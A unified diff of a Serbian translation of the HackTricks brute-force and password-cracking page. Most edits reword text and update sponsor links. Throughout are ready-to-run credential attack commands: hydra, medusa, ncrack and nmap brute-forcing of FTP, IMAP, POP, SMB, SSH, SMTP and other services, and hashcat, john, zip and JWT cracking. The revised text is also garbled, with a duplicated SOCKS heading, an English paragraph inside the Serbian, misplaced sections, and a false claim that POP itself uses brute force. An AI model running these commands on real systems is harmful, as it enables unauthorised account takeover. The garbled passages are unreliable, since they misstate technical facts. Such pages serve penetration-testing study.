@@ -3,10 +3,10 @@
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako kreirali i **automatizovali radne tokove** uz pomoć najnaprednijih alata zajednice.\
-Pristupite danas:
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
+Dobijte pristup danas:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 <details>
 
@@ -14,17 +14,17 @@ Pristupite danas:
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 ## Podrazumevane Akreditacije
 
-**Pretražite na google-u** podrazumevane akreditacije tehnologije koja se koristi, ili **probajte ove linkove**:
+**Pretražite na Google-u** podrazumevane akreditacije tehnologije koja se koristi, ili **probajte ove linkove**:
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -66,7 +66,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Alatka za generisanje liste reči, koja vam omogućava da obezbedite skup reči, pružajući vam mogućnost da kreirate više varijacija od datih reči, stvarajući jedinstvenu i idealnu listu reči za korišćenje u vezi sa određenim ciljem.
+Alatka za generisanje liste reči, koja vam omogućava da obezbedite skup reči, pružajući vam mogućnost da kreirate višestruke varijacije iz datih reči, stvarajući jedinstvenu i idealnu listu reči za korišćenje u vezi sa određenim ciljem.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -103,10 +103,10 @@ Finished in 0.920s.
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
-Pristupite danas:
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
+Dobijte pristup danas:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Usluge
 
@@ -123,8 +123,6 @@ msf> set USER_FILE <PATH_USERS>
 msf> run
 ```
 ### AJP
-
-AJP (Apache JServ Protocol) je mrežni protokol koji se koristi za komunikaciju između web servera i aplikacija koje se izvršavaju na platformi Java. AJP Brute Force napad se može koristiti za pokušaj otkrivanja lozinki tako što se sistematski isprobavaju različite kombinacije lozinki dok se ne pronađe tačna lozinka.
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
@@ -158,7 +156,7 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTP Generičko Brute
+### HTTP Generičko Brute Forcanje
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -187,6 +185,8 @@ cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
 ### IMAP
+
+IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. When a hacker is attempting to gain unauthorized access to an email account, they may use a brute force attack to guess the account password. This involves trying many different password combinations until the correct one is found.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -194,6 +194,8 @@ nmap -sV --script imap-brute -p <PORT> <IP>
 legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 ### IRC
+
+IRC (Internet Relay Chat) je protokol za real-time razgovor putem interneta. Brute force napadi na IRC servere mogu biti izvedeni korišćenjem alata kao što su Hydra, Ncrack ili Medusa. Ovi alati omogućavaju napadačima da automatski isprobaju veliki broj kombinacija korisničkih imena i lozinki kako bi dobili neovlašćen pristup IRC serveru.
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
@@ -286,13 +288,13 @@ Da biste koristili **oracle\_login** sa **patatorom**, potrebno je **instalirati
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**verzije 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** i **11.2.0.3**):
+[Bruteforce napad na hash OracleSQL-a van mreže](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**verzije 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** i **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
 ### POP
 
-POP (Post Office Protocol) je jedan od najstarijih protokola za pristup e-pošti. Brute force napadi na POP servere mogu biti efikasni ako su lozinke slabo postavljene.
+POP (Post Office Protocol) je jedan od najstarijih protokola za pristup e-pošti. POP koristi brute force tehniku za probijanje lozinki.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -369,6 +371,8 @@ onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.
 hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
 ```
 ### SMB
+
+SMB (Server Message Block) je protokol za deljenje datoteka koji se često koristi u Windows okruženjima.
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
@@ -380,6 +384,8 @@ hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
 legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
 ```
+### SOCKS
+
 ### SOCKS
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
@@ -406,9 +412,9 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Slabe SSH ključeve / Predvidljiv PRNG u Debianu
+#### Slabe SSH ključeve / Predvidljivi PRNG u Debianu
 
-Neke sisteme karakterišu poznate slabosti u slučajnom semenu korišćenom za generisanje kriptografskog materijala. Ovo može rezultirati dramatično smanjenim prostorom ključeva koji mogu biti probijeni alatima poput [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Takođe su dostupni unapred generisani setovi slabih ključeva poput [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Neke sisteme imaju poznate nedostatke u slučajnom semenu koje se koristi za generisanje kriptografskog materijala. To može rezultirati dramatično smanjenim prostorom ključeva koji se mogu probiti alatima poput [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Prethodno generisani setovi slabih ključeva takođe su dostupni poput [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ i OpenMQ)
 
@@ -453,10 +459,10 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
 Pristupite danas:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Lokalno
 
@@ -492,9 +498,9 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Poznati napad zip arhive sa tekstom
+#### Poznati napad na zip sa tekstom
 
-Potrebno je da znate **čisti tekst** (ili deo čistog teksta) **fajla koji se nalazi unutar** enkriptovane zip arhive. Možete proveriti **imenovanje fajlova i veličinu fajlova koji se nalaze unutar** enkriptovane zip arhive pokretanjem komande: **`7z l encrypted.zip`**\
+Potrebno je da znate **čisti tekst** (ili deo čistog teksta) **fajla koji se nalazi unutar** enkriptovanog zipa. Možete proveriti **imenа fajlova i veličinu fajlova koji se nalaze unutar** enkriptovanog zipa pokretanjem komande: **`7z l encrypted.zip`**\
 Preuzmite [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) sa stranice sa izdanjima.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -529,7 +535,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### Vlasnička lozinka PDF-a
 
-Da biste probili vlasničku lozinku PDF-a, proverite ovo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Da biste probili vlasničku lozinku PDF-a, proverite ovde: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -543,7 +549,7 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-### Dekripcija NTLM-a
+### NTLM dešifrovanje
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
@@ -583,7 +589,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Drugi Luks BF tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Još jedan LUKS BF tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -628,10 +634,10 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
 Dobijte pristup danas:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Alati
 
@@ -651,7 +657,7 @@ hash-identifier
 
 ### **Alati za generisanje wordlisti**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredni generator šetnje tastaturom sa konfigurabilnim osnovnim karakterima, mapom tastera i rutama.
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Napredni generator šetnje tastaturom sa konfigurabilnim baznim karakterima, mapom tastera i rutama.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -664,7 +670,7 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat napadi
+#### Napadi Hashcat-a
 
 * **Napad rečnikom** (`-a 0`) sa pravilima
 
@@ -675,7 +681,7 @@ hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 * **Napad kombinatora liste reči**
 
 Moguće je **kombinovati 2 liste reči u 1** pomoću hashcat-a.\
-Ako lista 1 sadrži reč **"hello"** a druga sadrži 2 linije sa rečima **"world"** i **"earth"**. Reči `helloworld` i `helloearth` će biti generisane.
+Ako lista 1 sadrži reč **"hello"** a druga sadrži 2 linije sa rečima **"world"** i **"earth"**. Biće generisane reči `helloworld` i `helloearth`.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -718,7 +724,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-* Napad sa listom reči + maskom (`-a 6`) / Maskom + listom reči (`-a 7`)
+* Napad rečnikom + maska (`-a 6`) / Maska + rečnik (`-a 7`) napad
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -730,33 +736,27 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-### Brute Forcing Linux Hashes - /etc/shadow fajl
-
-Brute force napadi su često korišćeni za pokušaje dešifrovanja lozinki iz Linux `/etc/shadow` fajla. Ovaj fajl sadrži kriptovane lozinke korisnika i obično se koristi za autentikaciju prilikom prijavljivanja na sistem. Korišćenjem brute force tehnike, napadači mogu pokušati različite kombinacije lozinki sve dok ne pronađu odgovarajuću lozinku za određenog korisnika. Ovo je jedan od osnovnih metoda za probijanje lozinki i zahteva vreme i resurse, ali može biti efikasan ako je lozinka slaba.
+### Kucanje Linux heševa - fajl /etc/shadow
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Razbijanje Windows heševa
+# Brute Force
+
+## Kako se radi
+
+Brute force napad je tehnika koja se koristi za pokušaj svih mogućih kombinacija šifri ili lozinki kako bi se pronašla tačna lozinka. Kada je reč o Windows lozinkama, brute force napad se može koristiti za pokušaj otkrivanja lozinke koja odgovara Windows hash-u.
+
+## Alati
+
+Postoje razni alati koji se mogu koristiti za izvođenje brute force napada na Windows hash-ovima, kao što su Hashcat, John the Ripper, i drugi. Ovi alati omogućavaju podešavanje različitih parametara napada, kao što su dužina lozinke, karakteri koji se koriste, i druge opcije.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-## Brute-Force
-
-### Kako se radi
-
-Brute-force napad je tehnika koja se koristi za pokušaj svih mogućih kombinacija lozinke dok se ne pronađe odgovarajuća. Ovo je često korišćena tehnika za probijanje zajedničkih aplikacionih hešova.
-
-### Alati
-
-Postoje razni alati koji se mogu koristiti za izvođenje brute-force napada, kao što su Hydra, John the Ripper, i Hashcat. Ovi alati omogućavaju podešavanje različitih parametara napada, kao što su dužina lozinke, karakteri koji se koriste, i slično.
-
-### Mere predostrožnosti
-
-Kako bi se sprečili brute-force napadi, preporučuje se korišćenje snažnih, jedinstvenih lozinki koje se redovno menjaju. Takođe je važno implementirati mehanizme zaštite kao što su zaključavanje naloga nakon određenog broja neuspelih pokušaja prijavljivanja.
+Razbijanje Čestih Aplikacionih Heševa
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -770,9 +770,9 @@ Kako bi se sprečili brute-force napadi, preporučuje se korišćenje snažnih, 
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Drugi načini da podržite HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -783,7 +783,7 @@ Drugi načini da podržite HackTricks:
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
 Dobijte pristup danas:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
